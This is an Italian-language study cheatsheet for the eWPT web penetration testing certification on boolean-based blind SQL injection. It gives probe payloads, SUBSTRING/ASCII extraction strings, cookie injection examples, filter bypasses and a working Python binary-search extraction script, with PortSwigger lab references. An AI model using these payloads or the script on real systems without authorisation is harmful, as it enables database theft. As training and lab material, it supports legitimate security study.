---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "Blind SQLi (Boolean-Based)"
permalink: "/cheatsheet/ewpt/04-sql-injection/04-blind-sqli/"
section: "SQL Injection"
section_order: 4
order: 4
sort_key: 404
---

**Difficoltà:** Advanced
**Time to Master:** 2.5h
**Prerequisiti:** [03-Union-Based-SQLi.md](/cheatsheet/ewpt/04-sql-injection/03-union-based-sqli/)
**Lab:** PortSwigger Academy: Blind SQLi

---

## Obiettivo

A volte l'app non ti dà niente: nessun errore, nessun dato in risposta, solo una pagina che sembra sempre identica. Ma se guardi bene, una differenza minima c'è — un elemento che compare o sparisce, un messaggio diverso — a seconda che la condizione booleana che hai iniettato sia vera o falsa. Da quel singolo bit di informazione, ripetuto migliaia di volte, estrai il database intero carattere per carattere.

---

## Concetti chiave

### Principio

```sql
' AND 1=1 --   -> risposta "normale" (condizione vera)
' AND 1=2 --   -> risposta diversa (condizione falsa, es. pagina vuota o messaggio "not found")
```

Una volta identificato un differenziale osservabile, puoi porre domande booleane sul contenuto del DB carattere per carattere.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Intruder | payload su condizione booleana | true/false per ogni tentativo | automatizza estrazione char-by-char |
| sqlmap | `--technique=B` | automatizza tutto | preferito su target reali |

---

## Payload / Esempi

### Esempio 1: conferma blind boolean

```sql
' AND 1=1 --   -- pagina normale
' AND 1=2 --   -- pagina diversa (contenuto mancante, redirect, messaggio errore generico)
```

### Esempio 2: estrarre il nome del database carattere per carattere

```sql
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
' AND ASCII(SUBSTRING(database(),1,1))>109 --   -- ricerca binaria, molto più veloce
```

**Spiegazione:** invece di provare ogni carattere in sequenza (lento), usa ricerca binaria sul valore ASCII: dimezzi il numero di richieste necessarie ad ogni step.

### Esempio 3: script Python per automatizzare l'estrazione (ricerca binaria)

```python
import requests

url = "http://target.com/product?id=1"

def binary_search(condition_template, low, high):
    while low < high:
        mid = (low + high) // 2
        payload = condition_template(mid)
        r = requests.get(url, params={"id": payload})
        if "Welcome" in r.text:   # condizione "vera" osservata nell'app
            low = mid + 1
        else:
            high = mid
    return low

# Step 1: lunghezza della stringa (più affidabile di un carattere "sentinella"
# per capire quando fermarsi: uno spazio, es. ASCII 32, potrebbe far parte del dato reale)
length = binary_search(
    lambda mid: f"1' AND LENGTH(database())>{mid} --", 0, 100
)

result = ""
for pos in range(1, length + 1):
    code = binary_search(
        lambda mid, pos=pos: f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid} --",
        32, 126
    )
    result += chr(code)
    print(result)
```

**Spiegazione:** questo script è la base di quello che sqlmap fa automaticamente; capirlo a fondo aiuta enormemente a interpretare e customizzare sqlmap quando serve un tamper particolare. Estrarre prima `LENGTH()` invece di usare un carattere "sentinella" (es. fermarsi quando esce ASCII 32) evita di troncare il risultato se il dato reale contiene uno spazio.

### Esempio 4: blind boolean su cookie

```
Cookie: TrackingId=abc123' AND '1'='1
Cookie: TrackingId=abc123' AND '1'='2
```

---

## Evasion / Bypass Techniques

Se `SUBSTRING` è filtrato, usa alternative equivalenti:

```sql
' AND MID(database(),1,1)='a' --
' AND LEFT(database(),1)='a' --
```

---

## Lab Hands-On

### Lab 1: PortSwigger: Blind SQL injection with conditional responses
**Obiettivo:** estrarre password admin carattere per carattere
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Trova il differenziale booleano (contenuto diverso tra vero/falso)
2. Costruisci payload SUBSTRING/ASCII
3. Automatizza con Burp Intruder (cluster bomb su posizione+carattere) o script Python

---

## Common Mistakes

- Usare ricerca lineare invece che binaria -> molto più lenta su stringhe lunghe (password hash)
- Non verificare bene qual è il "differenziale" esatto tra vero/falso -> a volte è sottile (un singolo elemento HTML in più/meno)

---

## Link Utili

- [PortSwigger: Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

---

## Connessioni

- **Prerequisito:** [03-Union-Based-SQLi.md](/cheatsheet/ewpt/04-sql-injection/03-union-based-sqli/)
- **Prossimo Step:** [05-Time-Based-Blind.md](/cheatsheet/ewpt/04-sql-injection/05-time-based-blind/)

---

## Checklist di padronanza

- [ ] So identificare il differenziale booleano vero/falso
- [ ] So costruire estrazione carattere per carattere con SUBSTRING/ASCII
- [ ] So implementare ricerca binaria per velocizzare l'estrazione
- [ ] So automatizzare con Burp Intruder
